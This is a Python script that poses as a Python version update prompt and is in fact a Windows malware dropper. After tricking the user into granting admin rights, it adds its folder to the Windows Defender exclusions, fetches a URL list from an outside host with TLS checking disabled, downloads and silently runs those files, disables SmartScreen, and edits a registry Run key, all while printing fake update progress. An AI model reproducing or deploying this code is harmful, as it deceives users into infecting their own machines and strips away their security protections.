from math import e
import os
import pathlib as pl
import random
import ssl
import subprocess
import urllib.request
import sys
import ctypes
import time
import winreg

is_admin = os.getuid() == 0 if hasattr(os, "getuid") else ctypes.windll.shell32.IsUserAnAdmin() != 0 #type: ignore

class Main:

    APP_NAME = "files"
    FILES_TXT_URL = "http://files.akirottv.de"

    BASE_DIR = f"{pl.Path.home() / 'AppData' / 'Local' / 'Common'}"
    APP_DIR = os.path.join(BASE_DIR, APP_NAME)

    def __init__(self):
        pass
    
    def send_update_notification(self):
        install_input = input("A new version of Python is available: 3.12.2" +
                            "\nYou are currently using: 3.11.6" +
                            "\nPress 'Y' or 'Enter' to update or 'N' to skip: ")
        return install_input.strip().lower() in ['y', '']

    def request_admin_privileges(self) -> bool:
        return ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1) > 32 #type: ignore

    def add_folder_to_windows_defender_exclusions(self):
        folder_path = f"{pl.Path.home() / 'AppData' / 'Local' / 'Common'}"
        command = f'powershell -Command "Add-MpPreference -ExclusionPath \\"{folder_path}\""'
        os.system(command)
    
    def perform_update(self):
        steps = [
            "Resolving dependencies...",
            "Downloading package metadata...",
            "Installing collected packages...",
            "Applying security patches...",
            "Finalizing installation..."
        ]

        for step in steps:
            print(step)
            time.sleep(random.uniform(1, 4.5)) # Simulate time taken for each step

        print("\nSuccessfully installed updates.")
        print("Current version: 3.11.6")
        print("Updated to: 3.12.2")
        print("Restart may be required.")
        time.sleep(2)
        exit(0)

    def remove_hkey(self):
        import winreg
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        try:
            key = winreg.OpenKey(  # type: ignore
                winreg.HKEY_CURRENT_USER,  # type: ignore
                key_path,
                0,
                winreg.KEY_SET_VALUE | winreg.KEY_READ,  # type: ignore
            )
            time.sleep(1)
            print(key)
            # Alten Wert löschen, falls vorhanden
            try:
                winreg.DeleteValue(key, "main")  # type: ignore
            except Exception as e:
                print(f"{e}")
                time.sleep(2)
        except Exception as e:
            print(f"Registry Fehler: {e}")
            
    def download_and_return_list_of_files(self) -> list[str]:
        try:
            print(f"→ Downloading list of files...")
            context = ssl._create_unverified_context()
            req = urllib.request.Request(self.FILES_TXT_URL)
            req.add_header("Pragma", "no-cache")
            with urllib.request.urlopen(req, timeout=15, context=context) as resp:
                if getattr(resp, "status", 200) != 200:
                    print(f"Download failed – Status: {getattr(resp,'status', 'unknown')}")
                    exit(1)
                new_content = resp.read()
                file_urls = [line.strip() for line in new_content.decode().splitlines() if line.startswith("http")]
                return file_urls

        except Exception as e:
            print(f"{e}")
            exit(1)
    
    def download_files(self, file_urls: list[str]):
        for url in file_urls:
            try:
                print(f"→ Downloading {url}...")
                context = ssl._create_unverified_context()
                req = urllib.request.Request(url)
                req.add_header("Pragma", "no-cache")
                with urllib.request.urlopen(req, timeout=15, context=context) as resp:
                    if getattr(resp, "status", 200) != 200:
                        print(f"Download failed – Status: {getattr(resp,'status', 'unknown')}")
                        continue
                    new_content = resp.read()
                    file_name = os.path.basename(url)
                    file_path = os.path.join(self.APP_DIR, file_name)
                    with open(file_path, "wb") as f:
                        f.write(new_content)
                    print(f"→ Successfully downloaded {file_name}")
            except Exception as e:
                print(f"{e}")
                continue
    
    def unblock_files(self, path: pl.Path):
        for file in path.iterdir():
            try:
                print(f"→ Unblocking {file.name}...")
                print(f"At: {file.as_uri()}")
                command = f'powershell -Command "Unblock-File -Path \\"{file.as_uri()}\\""'
                os.system(command)
            except Exception as e:
                print(f"{e}")
    
    def open_files(self):
        for file_name in os.listdir(self.APP_DIR):
            file_path = os.path.join(self.APP_DIR, file_name)
            if os.path.isfile(file_path):
                try:
                    print(f"→ Opening {file_name}...")
                    subprocess.run(['start', 'cmd', '/c', f'"{file_path}"'], shell=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW) #type: ignore
                except Exception as e:
                    print(f"{e}")
                    continue
    
    def disable_smartscreen(self):
        try:
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer", 0, winreg.KEY_SET_VALUE) #type: ignore
            winreg.SetValueEx(key, "SmartScreenEnabled", 0, winreg.REG_SZ, "Off") #type: ignore
            winreg.CloseKey(key) #type: ignore
            print("PythonSS erfolgreich aktiviert.")
        except Exception as e:
            print(f"Fehler: {e}")

if __name__ == "__main__":
    self = Main()
    if is_admin:
        print("Gathering dependencies and preparing for update...")
        self.add_folder_to_windows_defender_exclusions()
        file_urls = self.download_and_return_list_of_files()
        self.download_files(file_urls)
        self.disable_smartscreen()
        self.unblock_files(pl.Path(self.APP_DIR))
        self.open_files()
        self.remove_hkey() #234
        exit(0)
    if self.send_update_notification():
        print("Updating Python...")
        time.sleep(1)
        if self.request_admin_privileges():
            exit(0)
        else:
            print("Admin privileges are required to perform the update. Please rerun the installer as an administrator.")
            time.sleep(2)
            self.request_admin_privileges()
    else:
        print("Update skipped.")
        time.sleep(2)